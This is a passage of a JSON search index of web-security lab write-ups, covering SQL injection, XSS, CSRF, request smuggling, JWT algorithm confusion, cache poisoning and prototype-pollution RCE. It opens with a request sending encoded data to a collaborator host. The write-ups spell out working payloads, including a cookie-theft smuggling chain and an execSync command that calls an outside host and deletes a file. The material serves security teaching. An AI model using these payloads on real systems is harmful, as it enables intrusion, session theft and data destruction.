/?c=Q2drS0NRbFhaV3hqYjIxbExDQWdJUW9LQ1NBZ0NRb2dJQ0FnSUNBZ0lFRjBJRkYxWVdOcmNYVmhZMnNnWTI5eWNDQjBhR1VnWkdWMlpXeHZjR1Z5Y3lCMGFHbHVheUIwYUdGMElIUm9aWGtnWkc4Z2JtOTBJR2hoZG1VZ2RHOGdjR0YwWTJnZ1dGTlRJR0psWTJGMWMyVWdkR2hsZVNCcGJYQnNaVzFsYm5RZ2RHaGxJRU52Ym5SbGJuUWdVMlZqZFhKcGRIa2dVRzlzYVdONUlDaERVMUFwTGlCQ2RYUWdlVzkxSUdGeVpTQmhJR2hoWTJ0bGNpd2djbWxuYUhRZ1B5QkpKMjBnYzNWeVpTQjViM1VnZDJsc2JDQmlaU0JoWW14bElIUnZJR1Y0Wm1sc2RISmhkR1VnZEdocGN5Qm1iR0ZuT2lCN1JreEJSMTlTUlVSQlExUkZSSDB1SUNoUGJteDVJSFJvWlNCaWIzUWdhWE1nWVdKc1pTQjBieUJ6WldVZ2RHaGxJR1pzWVdjcENna2dJQWtLQ1NBZ0NRb0pJQ0FKQ1VScFpDQjViM1VnWm1sdVpDQmhJSFoxYkc1bGNtRmlhV3hwZEhrZ1B5QkdhV3hzSUhSb2FYTWdabTl5YlM0S0NTQWdDUW9KQ2dvZ0lBb0s= HTTP/1.1 Host: szv6rjvql5y6v5akgsvrda0rmis9gz4o.oastify.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Referer: http://challenge01.root-me.org:58008/ Upgrade-Insecure-Requests: 1 I’ll come back to this later.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "64439c0e359b8a192048d898ec8ff8bc",
    "u": "https://webapp.tymyrddin.dev/docs/id/2",
    "t": "Information disclosure on debug page ",
    "c": "Information disclosure on debug page  Description  This lab contains a debug page that discloses sensitive information about the application. Reproduction and proof of concept  With Burp running, browse to the home page. Go to the Target -> Site Map tab. Right-click on the top-level entry for the lab and select Engagement tools -> Find comments . The home page contains an HTML comment that contains a link called Debug . This points to /cgi-bin/phpinfo.php . In the site map, right-click on the entry for /cgi-bin/phpinfo.php and select Send to Repeater . In Burp Repeater, send the request to retrieve the file. It reveals debugging information, including the SECRET_KEY environment variable. Go back to the lab, click Submit solution , and enter the SECRET_KEY to solve the lab. Exploitability  An attacker will need to obtain and submit the SECRET_KEY environment variable.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "678d85a681b21d39b1c9a2f4b9c3e626",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/8",
    "t": "SQL injection attack, querying the database type and version on MySQL and Microsoft ",
    "c": "SQL injection attack, querying the database type and version on MySQL and Microsoft  Description  This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that sets the product category filter. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'# Use the following payload to display the database version: '+UNION+SELECT+@@version,+NULL# …",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ff7a5863fef7ac5e9b943e5945158ca",
    "u": "https://webapp.tymyrddin.dev/docs/xss/22",
    "t": "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped ",
    "c": "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped  Description  The website in this lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped. Reproduction and proof of concept  Enter a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater. Note the random string has been reflected inside a JavaScript string. Try sending the payload test'payload and observe that the single quote gets backslash-escaped, preventing you from breaking out of the string. Try sending the payload test\\payload and note the backslash does not get escaped. Replace the input with the following payload to break out of the JavaScript string and inject an alert: \\'-alert(1)// Verify the technique worked by right-clicking, selecting “Copy URL”, and pasting the URL in the browser. When you load the page it should trigger an alert.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cb6d450c3054e751a080af754228e426",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/2",
    "t": "CSRF where token validation depends on request method ",
    "c": "CSRF where token validation depends on request method  Description  This lab ’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. Reproduction and proof of concept  Open Burp’s browser and log in to your account. Submit the “Update email” form, and find the resulting request in your Proxy history. Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected. Use “Change request method” on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified. If you’re using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click “Regenerate”. Alternatively, if you’re using Burp Suite Community Edition, use the following HTML template. You can get the request URL by right-clicking and selecting “Copy URL”. <form action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\"> <input type=\"hidden\" name=\"email\" value=\"anything%40web-security-academy.net\"> </form> <script> document.forms[0].submit(); </script> Go to the exploit server, paste your exploit HTML into the Body field, and click Store . To verify if the exploit will work, try it out by clicking View exploit and checking the resulting HTTP request and response. Click Deliver to victim . Exploitability  An attacker needs to use the exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. There is an accounts on the application that can be used to design the attack. The credentials are wiener:peter .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "257686eabbf92497a94b77f22f35b3e5",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/11",
    "t": "Response queue poisoning via H2.TE request smuggling ",
    "c": "Response queue poisoning via H2.TE request smuggling  Description  This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. Reproduction and proof of concept  Intercept home page and send the request to Repeater. Set Repeater (top most menu) to Allow HTTP/2 ALPN override . Expand the Inspector’s Request Attributes section and change the protocol to HTTP/2 . Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding. POST / HTTP/2 Host: lab-id.web-security-academy.net Transfer-Encoding: chunked 0 SMUGGLED Every second request sent, receives a 404 response, confirming that the back-end appends the subsequent request to the smuggled prefix. Create a request, which smuggles a complete request to the back-end server. The path in both requests points to a non-existent endpoint. This means that the request will always get a 404 response. Once the response queue is poisoned, this will make it easier to recognise any other users’ responses that have successfully been captured. POST /x HTTP/2 Host: lab-id.web-security-academy.net Transfer-Encoding: chunked 0 GET /x HTTP/1.1 Host: lab-id.web-security-academy.net Note: Terminate the smuggled request properly by including the sequence \\r\\n\\r\\n after the Host header. Send the request to poison the response queue. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Response codes other than 404 indicate a response intended for the admin user has successfully been captured. Repeat the process until a 302 response is captured containing the admin’s new post-login session cookie. Note: If you receive some 200 responses but can’t capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again. This whole process can take some time. It took me ten minutes. Copy the stolen session cookie and use it to send a request to gain access to the admin panel : GET /admin HTTP/1.1 Host: 0a4900090385c6c5c058ef6800090039.web-security-academy.net Cookie: session=hVyiIwVQdrDveY8dV6Il427xj1q8G17f Send the request repeatedly until you receive a 200 response containing the admin panel. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ), then update the path in the request accordingly. Send the request to delete Carlos. Exploitability  An attacker will need to delete the user carlos by using response queue poisoning to break into the admin panel at /admin . An admin user will log in approximately every 15 seconds. The connection to the back-end is reset every 10 requests. If the connection gets into a bad state, send a few normal requests to get a fresh connection.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "032464c1d5f4f787dc146b70816d48f2",
    "u": "https://webapp.tymyrddin.dev/docs/acl/6",
    "t": "User ID controlled by request parameter, with unpredictable user IDs ",
    "c": "User ID controlled by request parameter, with unpredictable user IDs  Description  This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs. Reproduction and proof of concept  Find a blog post by carlos . Click on carlos and observe that the URL contains his user ID. Make a note of this ID. https://0a5c000f033d4106c25eb15600bc00a8.web-security-academy.net/blogs?userId=05bac43e-8599-476a-8650-16514c64a2d9 Log in with wiener:peter and access the account page. Change the “id” parameter to the saved user ID. Retrieve and submit the API key. Exploitability  An attacker will need to log in, find the GUID for carlos , then submit his API key as the solution.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4831d1222681170f00e4c00b2c48335d",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/idor",
    "t": "Insecure direct object references (IDOR) ",
    "c": "Insecure direct object references (IDOR)  Insecure direct object references (IDOR) occur when a developer uses an identifier for direct access to an internal implementation object but provides no additional access control and/or authorisation checks. You can automate IDOR hunting by using Burp or your own scripts. You can use the Burp intruder to iterate through IDs to find valid ones. The Burp extension Autorize scans for authorization issues by accessing higher-privileged accounts with lower-privileged accounts. The Burp extensions Auto Repeater and AuthMatrix allow you to automate the process of switching out cookies, headers, and parameters. For any serious security researcher, seeing an exposed internal identifier is an immediate invitation to test IDOR vulnerabilities, especially as they are a solid source of bug bounty payouts. To identify a potentially insecure object reference, you need to have some idea of how a specific application or website works, how it processes HTTP requests, and what information it should and should not reveal in its HTTP responses. Especially for more advanced vulnerabilities that involve passing data through APIs, detecting IDORs can be tricky. Steps  Create two accounts for each application role and designate one as the attacker account and the other as the victim account. Discover features in the application that might lead to IDORs. Pay attention to features that return sensitive information or modify user data. Revisit the features you discovered in step 2. With a proxy, intercept your browser traffic while you browse through the sensitive functionalities. With a proxy, intercept each sensitive request and switch out the IDs that you see in the requests. If switching out IDs grants you access to other users’ information or lets you change their data, you might have found an IDOR. Don’t despair if the application seems to be immune to IDORs. Use this opportunity to try a protection-bypass technique. If the application uses an encoded, hashed, or randomized ID, you can try decoding or predicting the IDs. You can also try supplying the application with an ID when it does not ask for one. Finally, sometimes changing the request method type or file type makes all the difference. Monitor for information leaks in export files, email, and text alerts. An IDOR now might lead to an info leak in the future. Draft the report. Bypassing protections  IDORs are not always as simple as switching out a numeric ID. As applications become more functionally complex, the way they reference resources also often becomes more complex. Modern web applications have also begun implementing more protection against IDORs, and many now use more complex ID formats. This means that simple, numeric IDORs are becoming rarer. Some applications use encoding schemes that can easily be reversed. Encode your false IDs by using an online base64url encoder and executing the IDOR. If you can not tell which encoding scheme the site is using, use the Smart Decode tool in Burp’s decoder. If the application is using a hashed or randomized ID, see if the ID is predictable. Sometimes applications use algorithms that produce insufficient entropy. Try creating a few accounts to analyse how these IDs are created. You might be able to find a pattern that will allow you to predict IDs belonging to other users. It might also be possible that the application leaks IDs via another API endpoint or other public pages of the application, like the profile page of a user. In modern web applications, you will commonly encounter scenarios in which the application uses cookies instead of IDs to identify the resources a user can access. And, for the convenience of the developers, for backward compatibility, or just because developers forgot to remove a test feature, some applications will feature an additional way of retrieving resources, using object IDs. If no IDs exist in the application-generated request, try adding one to the request: Append id , user_id , message_id , or other object references to the URL query, or the POST body parameters, and see if it makes a difference to the application’s behaviour. If one HTTP request method does not work, you can try plenty of others instead: GET , POST , PUT , DELETE , PATCH , etc. Applications often enable multiple request methods on the same endpoint but fail to implement the same access control for each method. Switching the file type of the requested file sometimes leads the server to process the authorisation differently. Applications might be flexible about how the user can identify information: they could allow users to either use IDs to reference a file or use the filename directly. But applications often fail to implement the same access controls for each method of reference. A note on blind IDORs  Sometimes endpoints susceptible to IDOR don’t respond with the leaked information directly. They might lead the application to leak information elsewhere instead: in export files, email, and maybe even in text alerts. Escalation  The impact of an IDOR depends on the affected function To maximize the severity of the bugs, you should always look for IDORs in critical functionalities first. Both read-based IDORs (which leak information but do not alter the database) and write-based IDORs (which can alter the database in an unauthorised way) can be of high impact. For state-changing, write-based IDORs, look for IDORs in password reset, password change, and account recovery features, as these often have the highest business impact. Target these over a feature that changes email subscription settings. For non-state-changing (read-based) IDORs, look for functionalities that handle the sensitive information in the application. For example, look for functionalities that handle direct messages, personal information, and private content. Consider which application functionalities make use of this information and look for IDORs accordingly. You can also combine IDORs with other vulnerabilities to increase their impact. For example, a write-based IDOR can be combined with self-XSS to form a stored XSS . An IDOR on a password reset endpoint combined with username enumeration can lead to a mass account takeover. Or a write IDOR on an admin account may even lead to RCE . Portswigger lab writeups  Insecure direct object references Remediation  Replace the insecure direct object references with indirect object references that are then internally mapped to actual objects. This could mean using a temporary per-session reference map populated only with values valid for a specific user and associated with random, non-sequential keys. Using secure (salted) hashes instead of actual object references is another way to make it harder for attackers to tamper with user-controllable values. These mitigations hide internal implementation details but do not address the underlying access control issues . A better approach to eliminating IDOR vulnerabilities is to ensure proper session management and object-level user access control checks. Even if an attacker manages to discover an internal object reference and manipulate it, they will not obtain unauthorised access. Resources  Portswigger: Insecure direct object references (IDOR) OWASP: Testing for Insecure Direct Object References OWASP Insecure Direct Object Reference Prevention Cheat Sheet HackTricks: IDOR Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c4ebd0e589f4b37df39a98d74e2e6137",
    "u": "https://webapp.tymyrddin.dev/docs/cache/3",
    "t": "Web cache poisoning with multiple headers ",
    "c": "Web cache poisoning with multiple headers  Description  This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. Reproduction and proof of concept  With Burp running, load the website’s home page. Go to Proxy -> HTTP history and study the requests and responses generated. Find the GET request for the JavaScript file /resources/js/tracking.js and send it to Burp Repeater. Add a cache-buster query parameter, such as ?cb=1234 , and the X-Forwarded-Host header with an arbitrary hostname, such as example.com . This does not seem to have any effect on the response. Remove the X-Forwarded-Host header and add the X-Forwarded-Scheme header instead. Including any value other than HTTPS, the result is a 302 response. The Location header shows redirection to the same URL as requested, but using https:// . Add the X-Forwarded-Host: example.com header back to the request, but keep X-Forwarded-Scheme: nothttps as well. Send this request and notice that the Location header of the 302 redirect now points to https://example.com/ . HTTP/1.1 302 Found Location: https://example.com/?cb=1234 Cache-Control: max-age=30 Age: 3 X-Cache: hit Connection: close Content-Length: 0 Go to the exploit server and change the file name to match the path used by the vulnerable response: /resources/js/tracking.js In the body, enter the payload alert(document.cookie) and store the exploit. Go back to the request in Burp Repeater and set the X-Forwarded-Host header as follows, remembering to enter your own exploit server ID: X-Forwarded-Host: exploit-0aa200fc046815d2c11220f0016c0089.exploit-server.net Make sure the X-Forwarded-Scheme header is set to anything other than HTTPS . Send the request until you see the exploit server URL reflected in the response and X-Cache: hit in the headers. To check that the response was cached correctly, right-click on the request in Burp, select Copy URL , and load the copied URL in the browser. If the cache was successfully poisoned, you will see the script containing the payload, alert(document.cookie) (The alert() won’t actually execute here). Go back to Burp Repeater, remove the cache buster, and resend the request until the cache is poisoned again. To simulate the victim, reload the home page in your browser and make sure that the alert() fires. Keep replaying the request to keep the cache poisoned until the victim visits the site and the lab is solved. Exploitability  An attacker will need to poison the cache with a response that executes alert(document.cookie) in the visitor’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5ef79c737fd957c6519a07fa8604bf6d",
    "u": "https://webapp.tymyrddin.dev/docs/traversal/2",
    "t": "File path traversal, traversal sequences blocked with absolute path bypass ",
    "c": "File path traversal, traversal sequences blocked with absolute path bypass  Description  This lab contains a file path traversal vulnerability in the display of product images. The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory. Reproduction and proof of concept  Use Burp Suite to intercept and modify a request that fetches a product image. Send to Repeater and modify the filename parameter, giving it the value /etc/passwd . The response contains the contents of the /etc/passwd file: Exploitability  An attacker will need to retrieve the contents of the /etc/passwd file.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c0e1bc9ef07265578eb0ec5cdd00c3a5",
    "u": "https://webapp.tymyrddin.dev/docs/xss/26",
    "t": "Reflected XSS in a JavaScript URL with some characters blocked ",
    "c": "Reflected XSS in a JavaScript URL with some characters blocked  Description  The website in this lab reflects the input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge, but the application is blocking some characters in an attempt to prevent XSS attacks. Reproduction and proof of concept  Visit the following URL, replacing 0a3300f80431576bc1cf0dee00110099 with your lab ID: https://0a3300f80431576bc1cf0dee00110099.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27 Click “Back to blog” at the bottom of the page. The exploit uses exception handling to call the alert function with arguments. The throw statement is used, separated with a blank comment in order to get round the no spaces restriction. The alert function is assigned to the onerror exception handler. As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the throw statement can be used. We then need to call this function, so we assign it to the toString property of window and trigger this by forcing a string conversion on window .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5475cb81c5506a17e0defa059010a8c0",
    "u": "https://webapp.tymyrddin.dev/docs/xss/13",
    "t": "Stored DOM XSS ",
    "c": "Stored DOM XSS  Description  The website in this lab contains a stored DOM vulnerability in the blog comment functionality. In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. Reproduction and proof of concept  Use a comment with the vector: <><img src=1 onerror=alert(1)>",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2d2f1c39a83247bcc5862635115b3fa9",
    "u": "https://webapp.tymyrddin.dev/docs/sockets/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Websockets Labs Introduction  What?  WebSockets are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions. WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any HTTP web security vulnerability can also exist in WebSockets communications. Why?  Finding WebSockets security vulnerabilities generally involves manipulating them in ways that the application doesn’t expect. How?  Websocket vulnerabilities Manipulating WebSocket messages to exploit vulnerabilities Manipulating the WebSocket handshake to exploit vulnerabilities Cross-site WebSocket hijacking",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "512750cdd75f85d5738c518503a02379",
    "u": "https://webapp.tymyrddin.dev/docs/business/5",
    "t": "Low-level logic flaw ",
    "c": "Low-level logic flaw  Description  This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. Reproduction and proof of concept  With Burp running, log in with wiener:peter and attempt to buy the leather jacket. The order is rejected because you don’t have enough store credit. In the proxy history, study the order process. Send the POST /cart request to Burp Repeater. In Burp Repeater, notice that you can only add a 2-digit quantity with each request. Send the request to Burp Intruder. Go to Burp Intruder. On the Positions tab, clear all the default payload positions and set the quantity parameter to 99. On the Payloads tab, select the payload type Null payloads . Under Payload options , select Continue indefinitely . Start the attack. While the attack is running, go to your cart. Keep refreshing the page every so often and monitor the total price. Eventually, notice that the price suddenly switches to a large negative integer and starts counting up towards 0. The price has exceeded the maximum value permitted for an integer in the back-end programming language ( 2,147,483,647 ), because the integer is stored as a 32 bit value in memory. As a result, the value has looped back around to the minimum possible value ( -2,147,483,648 ). Clear your cart. In the next few steps, we’ll try to add enough units so that the price loops back around and settles between \\(0 and the \\) 100 of your remaining store credit. This is not mathematically possible using only the leather jacket. Create the same Intruder attack again, but this time, under Payloads -> Payload Options , choose to generate exactly 323 payloads. Go to the Resource pool tab and add the attack to a resource pool with the Maximum concurrent requests set to 1 . Start the attack. When the Intruder attack finishes, go to the POST /cart request in Burp Repeater and send a single request for 47 jackets. The total price of the order should now be -$1221.96 . Use Burp Repeater to add a suitable quantity of another item to your cart so that the total falls between \\(0 and \\) 100. Place the order to solve the lab. Exploitability  An attacker will need to log in and buy a “Lightweight l33t leather jacket” for a price way less than intended.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ef1d7dcb3801e0630f1b588cd57ff033",
    "u": "https://webapp.tymyrddin.dev/docs/jwt/7",
    "t": "JWT authentication bypass via algorithm confusion ",
    "c": "JWT authentication bypass via algorithm confusion  Description  This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. Reproduction and proof of concept  Obtain the server’s public key  In Burp, load the JWT Editor extension from the BApp store. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user. In the browser, go to the standard endpoint /jwks.json and observe that the server exposes a JWK Set containing a single public key. {\"keys\":[{\"kty\":\"RSA\",\"e\":\"AQAB\",\"use\":\"sig\",\"kid\":\"755ba25e-ab8d-4c0f-bf55-37c8e00df45c\",\"alg\":\"RS256\",\"n\":\"ij8YJYUP37-rqoUJ9dzghcG8HaghpWB4oTmSEN509W4ArQBh19P72F271eRgrFxePIqqW7FhY3H04tOw8ybPOhqys56GCnFzM4NI8q-FA_QKr6hwyZJmm135lkBN_SyEx9r-UV4qOe0KmWBhL1k6jUAuITT5K5sy_YEEsLF3xgfA-suuz7Y3y0fswJgwnfsQz3zn3cKdbh3n2U7Cp5nX4G6im_SAjcaIhwKsA0sDPGUBwc7SY-_aFHcdni8vZPhrBw2qQAekK4nFpTfSl5_GzOWrapkle8ac88VVjjO0P9AWtJZhUb8mJn9MaBZJOEloLd9H6jGen0rnnN5h2iNX-w\"}]} Copy the JWK object from inside the keys array. Make sure that you don’t accidentally copy any characters from the surrounding array. {\"kty\":\"RSA\",\"e\":\"AQAB\",\"use\":\"sig\",\"kid\":\"755ba25e-ab8d-4c0f-bf55-37c8e00df45c\",\"alg\":\"RS256\",\"n\":\"ij8YJYUP37-rqoUJ9dzghcG8HaghpWB4oTmSEN509W4ArQBh19P72F271eRgrFxePIqqW7FhY3H04tOw8ybPOhqys56GCnFzM4NI8q-FA_QKr6hwyZJmm135lkBN_SyEx9r-UV4qOe0KmWBhL1k6jUAuITT5K5sy_YEEsLF3xgfA-suuz7Y3y0fswJgwnfsQz3zn3cKdbh3n2U7Cp5nX4G6im_SAjcaIhwKsA0sDPGUBwc7SY-_aFHcdni8vZPhrBw2qQAekK4nFpTfSl5_GzOWrapkle8ac88VVjjO0P9AWtJZhUb8mJn9MaBZJOEloLd9H6jGen0rnnN5h2iNX-w\"} Generate a malicious signing key  In Burp, go to the JWT Editor Keys tab in Burp’s main tab bar. Click New RSA Key . In the dialog, make sure that the JWK option is selected, then paste the JWK that you just copied. Click OK to save the key. Right-click on the entry for the key that you just created, then select Copy Public Key as PEM . -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAij8YJYUP37+rqoUJ9dzg hcG8HaghpWB4oTmSEN509W4ArQBh19P72F271eRgrFxePIqqW7FhY3H04tOw8ybP Ohqys56GCnFzM4NI8q+FA/QKr6hwyZJmm135lkBN/SyEx9r+UV4qOe0KmWBhL1k6 jUAuITT5K5sy/YEEsLF3xgfA+suuz7Y3y0fswJgwnfsQz3zn3cKdbh3n2U7Cp5nX 4G6im/SAjcaIhwKsA0sDPGUBwc7SY+/aFHcdni8vZPhrBw2qQAekK4nFpTfSl5/G zOWrapkle8ac88VVjjO0P9AWtJZhUb8mJn9MaBZJOEloLd9H6jGen0rnnN5h2iNX +wIDAQAB -----END PUBLIC KEY----- Use the Decoder tab to Base64 encode this PEM key, then copy the resulting string. LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFpajhZSllVUDM3K3Jxb1VKOWR6ZwpoY0c4SGFnaHBXQjRvVG1TRU41MDlXNEFyUUJoMTlQNzJGMjcxZVJnckZ4ZVBJcXFXN0ZoWTNIMDR0T3c4eWJQCk9ocXlzNTZHQ25Gek00Tkk4cStGQS9RS3I2aHd5WkptbTEzNWxrQk4vU3lFeDlyK1VWNHFPZTBLbVdCaEwxazYKalVBdUlUVDVLNXN5L1lFRXNMRjN4Z2ZBK3N1dXo3WTN5MGZzd0pnd25mc1F6M3puM2NLZGJoM24yVTdDcDVuWAo0RzZpbS9TQWpjYUlod0tzQTBzRFBHVUJ3YzdTWSsvYUZIY2RuaTh2WlBockJ3MnFRQWVrSzRuRnBUZlNsNS9HCnpPV3JhcGtsZThhYzg4VlZqak8wUDlBV3RKWmhVYjhtSm45TWFCWkpPRWxvTGQ5SDZqR2VuMHJubk41aDJpTlgKK3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg== Go back to the JWT Editor Keys tab in Burp’s main tab bar. Click New Symmetric Key . In the dialog, click Generate to generate a new key in JWK format. Note that you don’t need to select a key size as this will automatically be updated later. Replace the generated value for the k property with a Base64-encoded PEM that you just created. { \"kty\": \"oct\", \"kid\": \"f3010916-1cdf-490e-972c-bac83f450fcc\", \"k\": \"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFpajhZSllVUDM3K3Jxb1VKOWR6ZwpoY0c4SGFnaHBXQjRvVG1TRU41MDlXNEFyUUJoMTlQNzJGMjcxZVJnckZ4ZVBJcXFXN0ZoWTNIMDR0T3c4eWJQCk9ocXlzNTZHQ25Gek00Tkk4cStGQS9RS3I2aHd5WkptbTEzNWxrQk4vU3lFeDlyK1VWNHFPZTBLbVdCaEwxazYKalVBdUlUVDVLNXN5L1lFRXNMRjN4Z2ZBK3N1dXo3WTN5MGZzd0pnd25mc1F6M3puM2NLZGJoM24yVTdDcDVuWAo0RzZpbS9TQWpjYUlod0tzQTBzRFBHVUJ3YzdTWSsvYUZIY2RuaTh2WlBockJ3MnFRQWVrSzRuRnBUZlNsNS9HCnpPV3JhcGtsZThhYzg4VlZqak8wUDlBV3RKWmhVYjhtSm45TWFCWkpPRWxvTGQ5SDZqR2VuMHJubk41aDJpTlgKK3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==\" } Save the key. Modify and sign the token  Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token tab. In the header of the JWT, change the value of the alg parameter to HS256 . In the payload, change the value of the sub claim to administrator . At the bottom of the tab, click Sign , then select the symmetric key that you generated in the previous section. Make sure that the Don't modify header option is selected, then click OK . The modified token is now signed using the server’s public key as the secret key. Send the request and observe that you have successfully accessed the admin panel. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ). Send the request to this endpoint to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; obtain the server’s public key. (exposed via a standard endpoint); use this key to sign a modified session token that gives access to the admin panel at /admin ; then delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "592b1488703cf7342f263acc1e2e5015",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/9",
    "t": "Remote code execution via server-side prototype pollution ",
    "c": "Remote code execution via server-side prototype pollution  This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. Due to the configuration of the server, it’s possible to pollute Object.prototype in such a way that arbitrary system commands can be injected, that are executed on the server. Reproduction and PoCs  Study the address change feature  Log in with wiener:peter and visit the account page. Submit the form for updating your billing and delivery address. In Burp, go to the Proxy -> HTTP history tab and find the POST /my-account/change-address request. When submitting the form, the data from the fields is sent to the server as JSON. The server responds with a JSON object that appears to represent your user. This has been updated to reflect the new address information. Send the request to Burp Repeater. Identify a prototype pollution source  In Repeater, add a new property to the JSON with the name __proto__ , containing an object with a json spaces property. \"__proto__\": { \"json spaces\":10 } Send the request. In the Response panel, switch to the Raw tab. Notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype. Probe for remote code execution  In the browser, go to the admin panel and observe that there’s a button for running maintenance jobs. Click the button and observe that this triggers background tasks that clean up the database and filesystem. This is a classic example of the kind of functionality that may spawn node child processes. Try polluting the prototype with a malicious execArgv property that adds the --eval argument to the spawned child process. Use this to call the execSync() sink, passing in a command that triggers an interaction with the public Burp Collaborator server. For example: \"__proto__\": { \"execArgv\":[ \"--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')\" ] } Send the request. In the browser, go to the admin panel and trigger the maintenance jobs again. Notice that these have both failed this time. In Burp, go to the Collaborator tab and poll for interactions. Several DNS interactions, confirming the remote code execution have been received. Craft an exploit  In Repeater, replace the curl command with a command for deleting Carlos’s file: \"__proto__\": { \"execArgv\":[ \"--eval=require('child_process').execSync('rm /home/carlos/morale.txt')\" ] } Send the request. Go back to the admin panel and trigger the maintenance jobs again. Carlos’s file is deleted and the lab is solved. Exploitability  The command execution sink is only invoked when an admin user triggers vulnerable functionality on the site. An attacker will need to already have escalated privileges, giving access to admin functionality; find a prototype pollution source that can be used to add arbitrary properties to the global Object.prototype ; identify a gadget that can be used to inject and execute arbitrary system commands; and trigger remote execution of a command that deletes the file /home/carlos/morale.txt .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f1a37890ec9816235e7cf013a76023fc",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/pollution",
    "t": "Prototype pollution ",
